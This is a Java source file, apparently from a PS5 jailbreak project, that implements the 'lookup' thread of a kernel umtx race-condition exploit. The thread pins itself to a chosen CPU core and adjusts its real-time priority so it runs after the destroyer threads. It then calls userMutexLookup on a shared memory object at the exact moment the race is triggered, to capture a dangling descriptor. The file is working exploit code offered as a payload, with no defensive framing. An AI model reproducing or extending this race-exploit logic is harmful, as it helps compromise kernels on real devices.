package org.ps5jb.client.payloads.umtx.impl1;

import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.include.sys.CpuSet;
import org.ps5jb.sdk.include.sys.RtPrio;
import org.ps5jb.sdk.include.sys.Umtx;
import org.ps5jb.sdk.include.sys.errno.NotFoundException;

public class LookupJob extends CommonJob {
    private final State state;

    public LookupJob(State state) {
        super();

        this.jobName = "lookup";

        this.state = state;
    }

    protected void prepare() throws SdkException {
        super.prepare();

        // Move lookup thread to separate core.
        CpuSet cpuSet = new CpuSet(this.libKernel);
        cpuSet.setCurrentThreadAffinity(this.state.LOOKUP_THREAD_CORES);

        if (Config.toggleSetThreadPriorities) {
            // Set lookup thread's priority, so it will run after destroyer threads.
            RtPrio rtprio = new RtPrio(this.libKernel);
            rtprio.setRtPrio(0, Config.LOOKUP_THREAD_PRIORITY);
        }
    }

    protected void work() {
        final Umtx umtx = new Umtx(this.libKernel);
        while (!this.state.raceDoneFlag.get()) {
            DebugStatus.debug("Starting loop");

            DebugStatus.debug("Waiting for ready flag");
            while (!this.state.readyFlag.get()) {
                thread_yield();
            }

            // Notify main thread that lookup thread's loop is ready to start.
            this.state.numReadyThreads.incrementAndGet();

            DebugStatus.debug("Waiting for destroy flag");
            while (!this.state.destroyFlag.get()) {
                thread_yield();
            }

            // Trigger lookup of primary user mutex and check for result.
            try {
                this.state.lookupDescriptor = umtx.userMutexLookup(this.state.primarySharedMemoryKeyAddress);
                if (DebugStatus.isNoticeEnabled()) {
                    DebugStatus.notice("Lookup descriptor of primary shared memory object: " + this.state.lookupDescriptor);
                }
            } catch (NotFoundException e) {
                // Expected
                this.state.lookupDescriptor = -1;
            } catch (SdkException e) {
                this.state.lookupDescriptor = -1;
                DebugStatus.error("Performing lookup operation failed", e);
            }

            // Notify that lookup thread done its main job.
            this.state.numCompletedThreads.incrementAndGet();

            DebugStatus.debug("Waiting for check done flag");
            while (!this.state.checkDoneFlag.get()) {
                thread_yield();
            }

            // Notify main thread that lookup thread is ready to finish.
            this.state.numReadyThreads.incrementAndGet();

            DebugStatus.debug("Waiting for done flag");
            while (!this.state.doneFlag.get()) {
                thread_yield();
            }

            // Notify main thread that lookup thread's loop was finished.
            this.state.numFinishedThreads.incrementAndGet();
        }

        DebugStatus.debug("Waiting for destroy flag");
        while (!this.state.destroyFlag.get()) {
            thread_yield();
        }

        DebugStatus.notice("Finishing loop");
    }
}